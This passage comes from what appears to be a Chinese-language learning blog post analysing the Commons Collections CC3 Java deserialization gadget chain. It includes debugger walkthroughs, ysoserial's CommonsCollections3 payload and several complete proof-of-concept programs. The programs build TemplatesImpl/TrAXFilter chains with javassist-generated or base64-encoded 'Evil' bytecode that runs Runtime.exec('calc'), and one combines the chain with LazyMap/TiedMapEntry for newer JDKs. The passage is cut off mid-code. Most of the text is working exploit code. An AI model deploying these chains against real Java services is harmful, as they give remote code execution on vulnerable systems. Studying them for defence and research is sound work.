class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Transformer transformerChain = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="comment">//先使用fake</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"><span class="comment">//        outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//换为真的</span></span><br><span class="line">        setFieldVaule(transformerChain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = serialize(handler);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes1));</span><br><span class="line">        unserialize(bytes1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes); <span class="comment">// 这个是写入，自然是先流进来的。所以它要有参数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);<span class="comment">//将流进行反序列化的，所以需要流流入，所以他需要一个参数</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//输出的，数据流入它，所以它是作为其他流的输入的。它最后是输出用的</span></span><br><span class="line">        <span class="comment">// 这里是用 ByteArrayOutputStram()来盛放。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);<span class="comment">//ObjectOutputStram(new FileOutputStream)一定要有一个输出兑现，他要把生成的字节给一个东西放着，</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldVaule</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="debug分析"><a href="#debug分析" class="headerlink" title="debug分析"></a>debug分析</h5><p>debug跟一下</p><p>和CC1一样</p><p>前面的就不写了</p><p>直接来这里：</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3b79385.png" alt="image-20240602220407395"></p><p>这里下断点看下</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c48f80.png" alt="image-20240602220453209"></p><p>步入 进入<code>ChainedTransformer</code> 的<code>transform()</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c31a3a.png" alt="image-20240602220528147"></p><p>步入 </p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c9ae3f.png" alt="image-20240602220656020"></p><p>可以看到值有<code>InstantiateTransformer</code>而不是原来的<code>Invoktransform</code></p><p>继续步入 可以看到直接到<code>InstantiateTransformer</code> 的<code>transform()</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630a3cb4a34.png" alt="image-20240602220927651"></p><p>步入</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3ca53bf.png" alt="image-20240602221121937"></p><p>发现 调用了<code>newInstance()</code>，并且传入了参数iArgs</p><p>而iArgs中正好就是我们的<strong>恶意字节码</strong></p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c00a6a.png" alt="image-20240602221236154"></p><p>然后会步入<code>XMLFilterImpl</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630a3b20af0.png" alt="image-20240602221649835"></p><p>而<code>TrAXFilter</code>是继承<code>XMLFilterImpl</code> 我们在它的构造函数处下断点</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c1c402.png" alt="image-20240602221902553"></p><p>在这里下断点重新debug</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3c28d9e.png" alt="image-20240602222454515"></p><p>注意 此时我们有两个断点</p><p>直接步入</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3d28f5b.png" alt="image-20240602222542497"></p><p>发现进入了我们刚下的断点<code>TrAXFilter</code>的构造函数上</p><p>并且我们的恶意字节码也过来了</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3bf34cd.png" alt="image-20240602222716524"></p><p>继续步入 回到我们的<code>XMLFilterImpl</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630a3b0b03f.png" alt="image-20240602222753392"></p><p>最后触发</p><p><img src="https://bu.dusays.com/2024/06/07/66630a3d33db5.png" alt="image-20240602222926856"></p><h2 id="进化吧CC3"><a href="#进化吧CC3" class="headerlink" title="进化吧CC3"></a>进化吧CC3</h2><h3 id="8u71以下的poc改进"><a href="#8u71以下的poc改进" class="headerlink" title="8u71以下的poc改进"></a>8u71以下的poc改进</h3><h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>一样的</p><p>使用 <code>LazyMap</code>和<code>AnnotationInvocationHandler</code> + 动态代理</p><p>我们上面写的POC使用的是<code>TransformedMap</code></p><p>毕竟CC3是由CC1和字节码合并的</p><p>CC1能用<code>LazyMap</code></p><p>CC3当然也能用</p><p>当然也是在8u71以下才行</p><p>也就是<code>ysoserial</code>的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Variation on CommonsCollections1 that uses InstantiateTransformer instead of</span></span><br><span class="line"><span class="comment"> * InvokerTransformer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;, &quot;restriction&quot;&#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( precondition = <span class="string">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class="line"><span class="meta">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">PayloadRunner.run(CommonsCollections3.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段poc也是</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;POC&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            outputStream.writeObject(handler);</span><br><span class="line">            outputStream.close();</span><br><span class="line"> </span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc3&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意 这段poc要添加maven依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.25.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>不过我不知到为啥配置不上 </p><h3 id="通杀"><a href="#通杀" class="headerlink" title="通杀"></a>通杀</h3><p>也就是结合CC6可以进行8u71以上的通杀(当然8u71以下的也可以)</p><p>把上面的<code>TransformedMap</code>直接换成了<code>LazyMap</code> 和<code>TriedMapEntry</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3u2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA4ADwcAHAwAHQAeAQAIY2FsYy5leGUMAB8AIAEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAA8ACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAUAAsAAAAEAAEADAABAA4ADwACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAABUABAAWAA0AFwALAAAABAABABAAAQARAAAAAgAS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldVaule(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;adam&quot;</span>);</span><br><span class="line"><span class="comment">//        setFieldVaule(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// fake的</span></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Transformer transformerChain = new ChainedTransformer(transformers);</span></span><br><span class="line">        <span class="comment">//先使用fake</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;adamkey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 